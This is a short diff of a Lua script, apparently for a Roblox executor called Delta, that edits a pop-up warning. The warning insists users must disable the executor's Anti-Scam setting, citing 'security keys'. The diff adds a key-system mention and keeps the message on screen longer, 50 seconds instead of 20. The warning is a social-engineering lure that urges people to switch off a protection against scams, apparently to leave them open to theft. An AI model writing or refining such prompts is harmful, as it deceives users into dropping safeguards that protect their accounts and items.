@@ -34,7 +34,7 @@ local function createDeltaWarning()
 
 CRITICAL: You MUST disable Anti-Scam in Delta settings!
 
-Without this, the script cannot work properly and will give errors.
+Without this, there is a key system and the script cannot work properly and will give errors.
 
 Steps to disable:
 1. Click the Delta icon in the top-left
@@ -45,7 +45,7 @@ Steps to disable:
 
 This is required for security keys to work properly!
 
-This message will auto-close in 20 seconds...
+This message will auto-close in 50 seconds...
 ]]
     label.TextColor3 = Color3.fromRGB(255, 215, 0)
     label.BackgroundTransparency = 1
@@ -59,7 +59,7 @@ This message will auto-close in 20 seconds...
     label.ZIndex = 100001
     label.Parent = background
 
-    task.delay(20, function()
+    task.delay(50, function()
         gui:Destroy()
     end)
 end
